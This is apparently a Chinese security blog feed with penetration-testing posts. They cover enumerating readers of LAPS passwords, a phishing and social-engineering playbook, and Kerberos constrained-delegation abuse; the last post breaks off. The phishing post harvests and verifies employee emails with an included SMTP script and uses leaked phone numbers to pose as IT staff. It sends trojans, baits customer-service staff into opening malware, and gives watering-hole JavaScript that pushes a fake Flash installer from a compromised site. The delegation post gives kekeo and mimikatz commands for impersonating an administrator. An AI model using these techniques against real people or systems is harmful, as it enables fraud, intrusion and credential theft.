src="/img/laps/513a7d0d-e34e-4024-9dc7-21bb5abc61f1.png" alt="img"></p><p>安装包只能是msi</p><p><img src="/img/laps/d07bfb9e-60ee-485d-b448-8d65947f2be9.png" alt="img"></p><p>选择指派</p><p><img src="/img/laps/571ee35d-2441-4d2a-ac70-9d8d63e024f6.png" alt="img"></p><p>成功指向共享文件里的msi安装包</p><p><img src="/img/laps/ec1b1ad8-8461-42df-b242-8ecc3f10727f.png" alt="img"></p><p>当域用户登录桌面的时候，就会自动安装。如果已经安装过了则不会再安装了。</p><p><img src="/img/laps/2cd9072a-effb-42b6-b969-bc0050cc12cf.png" alt="img"></p><h3 id="0x03-2-lapsComputers组织创建组策略set-laps"><a href="#0x03-2-lapsComputers组织创建组策略set-laps" class="headerlink" title="0x03-2 lapsComputers组织创建组策略set laps"></a>0x03-2 lapsComputers组织创建组策略set laps</h3><p><img src="/img/laps/cf3cc113-ebfa-454a-b61b-0d2c2cc6d4c9.png" alt="img"></p><p><img src="/img/laps/aec206ed-3731-4aa9-92f3-cf923602ef3c.png" alt="img"></p><p>密码的设置，提供了多种复杂度的组合方式、密码长度和密码重置周期的设置。</p><p><img src="/img/laps/4f7b9405-b011-4bf7-9660-bad685319716.png" alt="img"></p><p>接下来是输入本地管理员的用户名,如果你修改的不是内置的Administrator，请在这里指定你希望修改的用户名，在未配置的情况下默认为内置的Administrator。</p><p><img src="/img/laps/854d33f5-65af-417d-aec4-fd69c110b398.png" alt="img"></p><p>接下来这一项是为了重置周期与密码有效期策略配合使用的设置。因为很多公司都有自己的密码过期策略，启用这一项可以避免两个配置发生冲突。</p><p><img src="/img/laps/1c6887c6-d170-4a51-af85-bf36c120191d.png" alt="img"></p><p>最后一项启用配置后确认对本地管理员密码开始进行设置。</p><p><img src="/img/laps/92bdc0aa-6729-469a-a184-e26a4c5f6003.png" alt="img"></p><h2 id="0x04-通过ldap查看laps的明文密码"><a href="#0x04-通过ldap查看laps的明文密码" class="headerlink" title="0x04 通过ldap查看laps的明文密码"></a>0x04 通过ldap查看laps的明文密码</h2><p>使用lapsAdminUsers组织里的lapsAdmins组里的成员lidan登录lapsComputers机器</p><p>可以看到登陆的时候显示正在安装laps</p><p><img src="/img/laps/7bbc7e74-12fc-4926-9ccb-cee566fcf8bb.png" alt="img"></p><p>通过lidan域用户或者域管用户查看ldap，选择lapsComputers里的域机器，可以看到本地管理员administrator的随机明文密码</p><p><img src="/img/laps/390f5927-8b8a-4b7e-9d47-47af4a0c3c5a.png" alt="img"></p><p>如果使用非lapsAdminsUsers组织lapsAdmins组里的域用户查看ldap，是看不到的密码的，只能看到是什么时候修改的</p><p><img src="/img/laps/536d59df-46a1-4ad5-8d67-d43f085ec333.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><h3 id="0x05-1-grouper2-导出组策略"><a href="#0x05-1-grouper2-导出组策略" class="headerlink" title="0x05-1 grouper2 导出组策略"></a>0x05-1 grouper2 导出组策略</h3><p>当我们遇到域环境时，先通过grouper2导出组策略看是否有laps</p><p>Grouper2.exe -d Motoo.nc -u liwei -p 1qaz@WSX -t 100 -f out.html</p><p><img src="/img/laps/1a93bd96-83b2-4d88-9fa9-ec4d9e8bd3d4.png" alt="img"></p><p>打开out.html，全局搜索laps</p><p><img src="/img/laps/005342bb-0a41-40bb-b3d2-f62d36aafb3c.png" alt="img"></p><p>通过uid可以找到laps链接到哪个组织</p><p><img src="/img/laps/3c6d0c63-2aab-413a-acf1-9a95ddd7f000.png" alt="img"></p><h3 id="0x05-2-LAPSTOOlkit工具寻找laps漏洞"><a href="#0x05-2-LAPSTOOlkit工具寻找laps漏洞" class="headerlink" title="0x05-2 LAPSTOOlkit工具寻找laps漏洞"></a>0x05-2 LAPSTOOlkit工具寻找laps漏洞</h3><pre><code>github : https://github.com/leoloobeek/LAPSToolkit/archive/master.zip显示全部启用了LAPS和密码扩展的计算机设备。get-help Get-LAPSComputers查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。get-help Find-LAPSDelegatedGroups       使用了get-NetOU针对每一个启用了LAPS的活动目录计算机，进行扩展权限分析，并查找哪一个用户组拥有AD读取权限，以及其中的用户是否具有“全部扩展权限”。系统管理员可能不知道哪一个具有“全部扩展权限”的用户可以查看密码，以及用户组中的哪一个用户安全等级比较低。这个功能可以针对每一个AD设备解析ACL权限，但对于范围比较大的域，解析时间会比较久。get-help Find-AdmPwdExtendedRights      使用了get-objectAcl原理​```Get-NetComputer -ComputerName &#39;LAPSCLIENT.test.local&#39; -FullData |Select-Object -ExpandProperty distinguishedname |ForEach-Object { $_.substring($_.indexof(&#39;OU&#39;)) } | ForEach-Object {  Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and  ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject​```首先，我们将获取Get-NetComputer -FullData的完整数据对象。然后，我们提取并扩展 distinguishedname属性，找到“ OU”的索引，然后仅返回字符串的该部分。我们在这里所做的只是枚举特定计算机所属的OU。接下来，我们使用Get-ObjectAcl枚举该指定OU的ACL， 并使用-ResolveGUIDs将GUID解析为通用显示名称。然后，我们过滤权限条目，仅返回那些在ms-Mcs-AdmPwd字段上包含读取权限的条目 。我们无法确定从IdentityReference字段返回的名称 是组还是用户，因此我们可以使用PowerView的 Convert-NameToSid cmdlet将对象转换为直接安全标识符（SID），然后将其最终传递给 Get -ADObject返回具有对该字段的读取权限的完整活动目录用户/组对象。从结果中我们可以看到，“ LAPS_recover”域组被授予读取权限。现在，如果我们想枚举所有LAPS应用程序，并且谁拥有对它们的读取权限，该怎么办？由于最近对Get-ObjectACL的参数流水线进行了一些优化，因此比以往任何时候都更容易​```Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and   ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  $_ | Add-Member NoteProperty &#39;IdentitySID&#39; $(Convert-NameToSid $_.IdentityReference).SID;  $_}​```</code></pre><p>查询哪些机器使用了laps</p><pre><code>Get-LAPSComputers</code></pre><p><img src="/img/laps/69a50a66-840f-4f70-af87-19189c50f8dd.png" alt="img"></p><p>查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。</p><pre><code>import-module .\LAPSToolkit.ps1Find-LAPSDelegatedGroups</code></pre><p><img src="/img/laps/4775375f-394e-4877-adbb-ffcde56bf976.png" alt="img"></p><p><strong>从上图结果得知，lapsAdmins组里的用户可以读取lapsComputers组织里的所有域机器的本地管理员密码</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>http://drops.xmd5.com/static/drops/tips-10496.htmlhttp://tech.canway.net/news/164.htmlhttp://www.harmj0y.net/blog/powershell/running-laps-with-powerview/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LAPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之寻鱼</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之寻鱼"><a href="#钓鱼与社工系列之寻鱼" class="headerlink" title="钓鱼与社工系列之寻鱼"></a>钓鱼与社工系列之寻鱼</h1><h2 id="0x01-广撒网"><a href="#0x01-广撒网" class="headerlink" title="0x01 广撒网"></a>0x01 广撒网</h2><p>从互联网中收集目标员工邮箱，发送钓鱼邮件</p><h3 id="0x01-1-邮箱收集-theHarvester"><a href="#0x01-1-邮箱收集-theHarvester" class="headerlink" title="0x01-1 邮箱收集-theHarvester"></a>0x01-1 邮箱收集-theHarvester</h3><p>这里推荐使用theHarvester脚本收集邮箱</p><pre><code>https://github.com/laramies/theHarvester</code></pre><p>语法：-d参数指向目标的域名，-b all是用调用theHarvester的所有模板查找邮箱</p><pre><code>python3 theHarvester.py -d xxx.com -b all</code></pre><p><img src="/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png" alt="img"></p><h3 id="0x01-2-邮箱收集-搜索引擎"><a href="#0x01-2-邮箱收集-搜索引擎" class="headerlink" title="0x01-2  邮箱收集-搜索引擎"></a>0x01-2  邮箱收集-搜索引擎</h3><pre><code>微匹：http://www.veryvp.com/hunter: https://hunter.io/search/domain.comskymem: https://www.skymem.info/</code></pre><p><img src="/img/fish/05cd1a41-ad6b-405c-8bbb-286382a65113.png" alt="img"></p><p><img src="/img/fish/86b65aa3-af79-4e50-bd85-aca4910bf051.jpg" alt="img"></p><p><img src="/img/fish/f404f8ce-3cda-4f91-bfc3-8f3eabfba2d5.png" alt="img"></p><h3 id="0x01-3-邮箱收集-验证邮箱有效性"><a href="#0x01-3-邮箱收集-验证邮箱有效性" class="headerlink" title="0x01-3  邮箱收集-验证邮箱有效性"></a>0x01-3  邮箱收集-验证邮箱有效性</h3><p>收集到邮箱后，可以先验证邮箱是否真实有效，通过以下的脚本验证邮箱的真实性，脚本在文章末尾。</p><p><img src="/img/fish/89aad28f-1374-43c3-9766-3d83017e820b.png" alt="img"></p><p>然后对这些真实存在的邮箱发送钓鱼邮件即可。</p><p>邮件内容要能吸引员工兴趣，最好是关乎到他们的利益，这样才能诱导他们查看。</p><p>并且设置自己的邮箱昵称与目标相关，例如：行政服务部</p><h3 id="0x01-4-QQ等第三方邮箱发送钓鱼邮件"><a href="#0x01-4-QQ等第三方邮箱发送钓鱼邮件" class="headerlink" title="0x01-4 QQ等第三方邮箱发送钓鱼邮件"></a>0x01-4 QQ等第三方邮箱发送钓鱼邮件</h3><p><img src="/img/fish/9aa41b3f-fb07-406b-8341-6f494d2f41d7.jpg" alt="img"></p><p><img src="/img/fish/e8f6a74b-57c5-426f-9577-4c673cc32b33.png" alt="img"></p><h3 id="0x01-5-目标员工邮箱"><a href="#0x01-5-目标员工邮箱" class="headerlink" title="0x01-5 目标员工邮箱"></a>0x01-5 目标员工邮箱</h3><p>使用目标员工的邮箱发送马，不用考虑邮件网关导致发不进去</p><p><img src="/img/fish/9194e784-f2b8-4c98-bf0e-49bb6ff9dfdf.jpg" alt="img"></p><h3 id="0x01-6-OA办公系统"><a href="#0x01-6-OA办公系统" class="headerlink" title="0x01-6 OA办公系统"></a>0x01-6 OA办公系统</h3><p>OA办公系统可以获取目标大量员工联系方式，对一些安全意识薄弱的部门员工发送“非常重要”的消息。</p><p><img src="/img/fish/b12ddace-ada5-43ac-bbc3-f000ea0abf44.jpg" alt="img"></p><h2 id="0x02-定向钓鱼（制作对应鱼饵）"><a href="#0x02-定向钓鱼（制作对应鱼饵）" class="headerlink" title="0x02 定向钓鱼（制作对应鱼饵）"></a>0x02 定向钓鱼（制作对应鱼饵）</h2><h3 id="0x02-1-对收集到的邮箱用户定向钓鱼"><a href="#0x02-1-对收集到的邮箱用户定向钓鱼" class="headerlink" title="0x02-1 对收集到的邮箱用户定向钓鱼"></a>0x02-1 对收集到的邮箱用户定向钓鱼</h3><p>通过tg的社工库查邮箱获取手机号，再通过手机号添加微信定向社工。</p><p>下图是我通过qq邮箱发送钓鱼邮件后，如果邮箱存在，则会显示已投递到对方邮箱，如果邮箱不存在，则显示投递失败，已退信。</p><p>通过该方法，也可以判断邮箱是否有效。</p><p><img src="/img/fish/cb1d45bb-5c0e-4275-af44-52ec2873526a.png" alt="img"></p><p>通过qq邮箱发送，还有一个好处，就是有些用户会设置自动回复或者回复了我们的邮件，那么这时候就可以获取到该用户的一些信息。</p><p><img src="/img/fish/a8636bec-8890-4188-b7f2-a05d5d96d308.png" alt="img"></p><p><img src="/img/fish/84045831-d7bb-4473-9ec5-45bcd561d4fa.png" alt="img"></p><p>从收集到的邮箱中中选择了lining9用户的邮箱，在tg中找到了该邮箱泄露的信息，我们应该关注的重点信息是手机号</p><p><img src="/img/fish/ec4df603-0ad9-49fb-ad49-29e72057f935.png" alt="img"></p><p>然后通过微信小号查找该手机号，并添加对方为好友。</p><p>这里我直接报对方的名字和邮箱号，一是可以判断是否加错，二是获取对方的信任。</p><p><img src="/img/fish/3897192d-127c-4176-91d0-3c3722aeee04.png" alt="img"></p><p>制作和目标相关的木马，这个需要先去了解目标的情况。</p><p>这里我是调查了他们员工都是用了一种安全桌面客户端，所以我就伪装自己是公司的技术部门，让他更新补丁，于是将马发送给他后，不一会儿就上线到CS了。</p><p><img src="/img/fish/e05740f7-8504-41e4-832f-11756649f22d.png" alt="img"></p><h3 id="0x02-2-通过关键字寻找鱼并定向钓鱼"><a href="#0x02-2-通过关键字寻找鱼并定向钓鱼" class="headerlink" title="0x02-2 通过关键字寻找鱼并定向钓鱼"></a>0x02-2 通过关键字寻找鱼并定向钓鱼</h3><p>举个例子，通用关键字有： 联系方式、简历、招聘、应聘、贷款、手机号、邮箱 等等</p><p>对于一些特殊行业，那么可以自己联想关键字，例如 投标、招标、投诉 等等</p><p>自己发挥想象，各种关键字相互组合。</p><pre><code>目标名字&quot;XXXX&quot;  联系方式        投递简历        hr        招聘        应聘        贷款        手机号</code></pre><p><img src="/img/fish/485c876c-bf8b-4d2d-b6a7-a350bb1221f0.jpg" alt="img"></p><p><img src="/img/fish/83aa07fe-3b6d-4ec6-acca-4cc9709038a2.jpg" alt="img"></p><p>制作一个应聘简历马，然后发过去就可以了。</p><p><img src="/img/fish/44eae351-55e2-4bb6-8733-fb2c659400f6.jpg" alt="img"></p><h3 id="0x02-3-在线客服"><a href="#0x02-3-在线客服" class="headerlink" title="0x02-3 在线客服"></a>0x02-3 在线客服</h3><p>一些企业或者金融行业，他们的网站都有在线客服功能。那么可以通过人工服务去定向社工。</p><p>例如：在线客服处有上传文件的功能，那么就将我们的马直接传上去，诱导客服运行。</p><p>或者就想办法加这些客服人员的微信，具体的话术自己构造。</p><p><img src="/img/fish/50155984.png" alt="img"></p><p>上图中的马的名字也是有根据的，我是在他们的网站上找到下面的信息，然后问客服打不开文件是什么原因。诱导客服尝试打开我们的马。</p><p><img src="/img/fish/26a19d19-5db1-4a75-9359-b8b7a5b5f1ef.png" alt="img"></p><h3 id="0x02-4-水坑"><a href="#0x02-4-水坑" class="headerlink" title="0x02-4 水坑"></a>0x02-4 水坑</h3><p>前提：拿下了webshell后，在webshell中植入下面的项目。</p><pre><code>https://github.com/r00tSe7en/Flash-Pop</code></pre><p>效果：当有人第一次访问时，会触发下图的弹框，诱导访问者点击立即升级，这时候会跳转到我们的Flash木马地址自动下载。当访问者点击安装了木马后，就会上线到远控端。然后将访问者的浏览器设置一个cookies，避免访问者刷新后又弹框。这样就不会触发访问者的警觉了，误以为安装了Flash后就可以了。</p><p><img src="/img/fish/f02b1d44-d657-425d-815f-82803520ade0.jpg" alt="img"></p><p>验证邮箱真实性脚本</p><pre><code>&#39;&#39;&#39;在线验证邮箱真实性&#39;&#39;&#39;import randomimport smtplibfrom termcolor import cprintimport dns.resolverimport timefrom queue import Queuefrom threading import Thread# 查询邮件服务器def get_mailServer(server):    print(&#39;查找[{}]邮箱服务器...&#39;.format(server))    try:        answers = dns.resolver.query(server, &#39;MX&#39;)        res = [str(rdata.exchange)[:-1] for rdata in answers]        print(&#39;\t[{}]邮件服务器：{}&#39;.format(server, res))        return res    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return []# 判断邮箱是否存活def checkEmail(mailServers, emails_queue, aliveEmails):    try:        mailServer = random.choice(mailServers)        print(&#39;\t连接服务器:{}&#39;.format(mailServer))        s = smtplib.SMTP(mailServer, timeout=10)    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return    while not emails_queue.empty():        email = emails_queue.get()        num = emails_queue.qsize()        try:            helo = s.docmd(&#39;HELO chacuo.net&#39;)            # print(helo)   # (250, b&#39;Forcepoint email protection service&#39;)            send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)            # print(send_from)  # (250, b&#39;2.1.0 Ok&#39;)            send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)            # print(send_from)  # (550, b&#39;5.1.1 Error: invalid recipients is found from 101.68.81.227&#39;) 或者 (250, b&#39;2.1.5 Ok&#39;)            if send_from[0] == 250 or send_from[0] == 451:                # final_res[email] = True  # 存在                cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                aliveEmails.append(email)            elif send_from[0] == 550:                # final_res[email] = False  # 不存在                print(&#39;\t[{}] [-] {} 不存在&#39;.format(num, email))            elif send_from[0] == 503:                cprint(&#39;\t[{}] [-] {} code = 503 重新连接邮件服务器{}&#39;.format(num, email, mailServer))                s.close()                time.sleep(10)                try:                    s = smtplib.SMTP(mailServer, timeout=10)                except Exception as e:                    s.close()                    time.sleep(10)                    s = smtplib.SMTP(mailServer, timeout=10)                helo = s.docmd(&#39;HELO chacuo.net&#39;)                send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)                send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)                if send_from[0] == 250 or send_from[0] == 451:                    cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                    aliveEmails.append(email)                elif send_from[0] == 550:                    print(&#39;\t[{}] [-] {}&#39;.format(num, email))            else:                # final_res[email] = None  # 未知                print(&#39;\t[{}] [-] {} : {} : {}&#39;.format(num, email, send_from[0], send_from))        except Exception as e:            print(&#39;\t[{}] [error] {} : {}&#39;.format(num, email, e.args))            s.close()            try:                s = smtplib.SMTP(mailServer, timeout=10)            except Exception as e:                s.close()                time.sleep(10)                s = smtplib.SMTP(mailServer, timeout=10)    s.close()def run(emails):    Server_emails = {}          aliveEmails = []    # 存活的emails    for email in emails:        name, server = email.split(&#39;@&#39;)        if Server_emails.get(server):            Server_emails[server].append(email)        else:            Server_emails[server] = [email]    print(Server_emails)    for server in Server_emails:        mailServers = get_mailServer(server)        if mailServers:            emailsNums = len(Server_emails[server])            emails_queue = Queue(-1)            for email in Server_emails[server]:                emails_queue.put(email)            threads = []            for i in range(5):                t = Thread(target=checkEmail, args=(mailServers, emails_queue, aliveEmails))                threads.append(t)                t.start()            for t in threads:                t.join()    return aliveEmailsdef run_verifyEmails(emails):    aliveEmails = run(emails)    return aliveEmailsif __name__ == &#39;__main__&#39;:    emails = []    with open(&#39;mail.txt&#39;, &#39;rt&#39;) as f:        for each in f.readlines():            emails.append(each.strip())    aliveEmails = run_verifyEmails(emails)    print(aliveEmails)</code></pre><p>flash.js新增代码，通过新增cookeis避免多次弹框：</p><pre><code>function setCookie(cname,cvalue,exdays) {  var d = new Date();  d.setTime(d.getTime() + (exdays*24*60*60*1000));  var expires = &quot;expires=&quot; + d.toGMTString();  document.cookie = cname + &quot;=&quot; + cvalue + &quot;;&quot; + expires + &quot;;path=/&quot;;}function getCookie(cname) {  var name = cname + &quot;=&quot;;  var decodedCookie = decodeURIComponent(document.cookie);  var ca = decodedCookie.split(&#39;;&#39;);  for(var i = 0; i &lt; ca.length; i++) {    var c = ca[i];    while (c.charAt(0) == &#39; &#39;) {      c = c.substring(1);    }    if (c.indexOf(name) == 0) {      return c.substring(name.length, c.length);    }  }  return &quot;&quot;;}var download666 = function() {    setCookie(&quot;username1&quot;, &quot;True&quot;, 30);    setTimeout(&quot;location.href=&#39;./&#39;&quot;, 500 );    setTimeout(&quot;localStorage.setItem(&#39;isUpdate&#39;, &#39;1&#39;);&quot;, 500 );    window.open(&#39;./autoinstall/flashplayerpp_install_cn.exe&#39;);}function checkCookie() {    var user=getCookie(&quot;username1&quot;);    if (user == &quot;&quot;) {        document.write(&quot;&lt;script src=&#39;./layer/jquery.min.js&#39;&gt;&lt;/script&gt;&quot;);        document.write(&quot;&lt;script src=&#39;./layer/layer.js&#39;&gt;&lt;/script&gt;&quot;);        window.onload = function(){            layer.open({                type: 1,                move: false ,                area: [&#39;613px&#39;, &#39;328px&#39;],                title: false,                shade: 0.6,                //maxmin: true ,                anim: 1,                offset: &#39;100px&#39;,                scrollbar: false,                content: &#39;&lt;a href=&quot;javascript:;&quot; onclick=&quot;download666()&quot;&gt;&lt;img src=&quot;./flash.jpg&quot;&gt;&lt;/a&gt;&#39;//创建图像            });        }    }}checkCookie();</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之寻鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约束委派利用</title>
      <link href="/2020/11/25/yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-约束委派利用"><a href="#0x09-约束委派利用" class="headerlink" title="0x09-约束委派利用"></a>0x09-约束委派利用</h1><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><pre><code>《AD域用户加域委派》https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html《域渗透——Kerberos委派攻击》     -- 主要是这篇文章https://xz.aliyun.com/t/7217#toc-9《利用域委派获取域管理权限》https://www.anquanke.com/post/id/92484《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw《这是一篇“不一样”的真实渗透测试案例分析文章》https://cloud.tencent.com/developer/article/1601095</code></pre><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><pre><code>借用Klion的环境域控：192.168.3.142域机器：Srv-DB-0day域机器：PC-jerry-0day服务账号:0day\sqlsvr Admin12345工具：ADFind.exe      查找域中配置约束委派用户kekeo.exe       请求TGT，获取STmimikatz        导入ST，获取权限</code></pre><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p><p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）</p><pre><code>非约束性委派（Unconstrained Delegation）服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</code></pre><pre><code>约束性委派（Constrained Delegation）即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</code></pre><h3 id="服务账号、主机账号、普通账号"><a href="#服务账号、主机账号、普通账号" class="headerlink" title="服务账号、主机账号、普通账号"></a>服务账号、主机账号、普通账号</h3><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p>服务账号：⬇</p><p><img src="/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png" alt="img"></p><p>主机账号：⬇</p><p><img src="/img/delegation/862a6496-aa6d-4e53-89c0-915a769c5848.png" alt="img"></p><p>普通账号：⬇</p><p><img src="/img/delegation/368b1b91-3985-4ec8-9b95-7b09c1b431ec.png" alt="img"></p><h2 id="0x02-约束委托利用"><a href="#0x02-约束委托利用" class="headerlink" title="0x02 约束委托利用"></a>0x02 约束委托利用</h2><p>模拟环境，在域机器：PC-jerry-0day上</p><h3 id="1-查找域中配置约束委派用户"><a href="#1-查找域中配置约束委派用户" class="headerlink" title="1. 查找域中配置约束委派用户"></a>1. 查找域中配置约束委派用户</h3><pre><code>AdFind.exe -h 192.168.3.142 -u sqlsvr -up Admin12345 -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre><p><img src="/img/delegation/c655de04-feac-4072-96ed-1cb59df6970d.png" alt="img"></p><p>那么当我们获取了sqlsvr域用户的账号密码后，就可以登录查出来的任意域机器</p><p>先查询下Srv-DB-0day域机器的管理组，使用服务账号建立IPC连接，用local查询本地管理组。可以看到sqlsvr并不能对Srv-DB-0day域机器有操作权限</p><p><img src="/img/delegation/ffe5a7ac-d47b-464f-8e7c-97ef90400c13.png" alt="img"></p><h3 id="2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"><a href="#2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST" class="headerlink" title="2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"></a>2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST</h3><pre><code>kekeo.exetgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbitgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/Srv-DB-0day.0day.org</code></pre><p>用kekeo请求该用户的TGT</p><p>tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi</p><p>/user: 服务用户的用户名</p><p>/password: 服务用户的明文密码</p><p>/domain: 所在域名</p><p>/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</p><p>得到服务用户TGT：<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi</p><p>使用这张TGT通过伪造s4u请求以administrator用户身份请求访问Srv-DB-0day CIFS的ST</p><p>tgs::s4u /tgt:<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi /user:<a href="mailto:Administrator@0day.org" target="_blank" rel="noopener">Administrator@0day.org</a> /service:cifs/Srv-DB-0day.0day.org</p><p>S4U2Self获取到的ST1以及S4U2Proxy获取到的Srv-DB-0day CIFS服务的ST2会保存在当前目录下</p><p><img src="/img/delegation/3856b471-3f77-4497-a05e-d108b3082d2c.png" alt="img"></p><p><img src="/img/delegation/0660e189-5f7a-4c7b-882d-2614b32a8c81.png" alt="img"></p><h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h3><p>使用mimikatz将ST2导入当前会话即可，如果有杀软，自行免杀。需要以管理员权限运行mimikatz</p><pre><code>kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~Srv-DB-0day.0day.org@0DAY.ORG.kirbidir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a-a23b-428c-a1e5-7b1fae22aa80.png" alt="img"></p><h2 id="0x03-视频演示"><a href="#0x03-视频演示" class="headerlink" title="0x03 视频演示"></a>0x03 视频演示</h2><p><img src="/img/delegation/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于资源的约束委派利用</title>
      <link href="/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-基于资源的约束委派利用"><a href="#0x09-基于资源的约束委派利用" class="headerlink" title="0x09 基于资源的约束委派利用"></a>0x09 基于资源的约束委派利用</h1><h2 id="0x01-应用场景："><a href="#0x01-应用场景：" class="headerlink" title="0x01 应用场景："></a>0x01 应用场景：</h2><p>​    在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p><p>0.限制：只能在windows 2012及以上版本的域控才可以，因为08及以下的域控没有msDS-AllowedToActOnBehalfOfOtherIdentity这个属性</p><p><img src="/img/delegation/70ffc507-8f02-4621-8811-a8050fd47030.png" alt="img"></p><p><img src="/img/delegation/507dd4fe-2571-40b6-9d6b-9cb0cd441e2c.png" alt="img"></p><p>\1. 提权：当我们钓鱼拿下一台员工机器，发现是在域里面的，然后在电脑里发现addUser域用户的账号密码，因为需要addUser域用户将员工机器加入到域环境里，所以有可能会获得到addUser的账号密码。然后发现当前域用户并不在本地管理组里，就可以通过addUser域用户提权到adminsitrator。</p><p>\2. 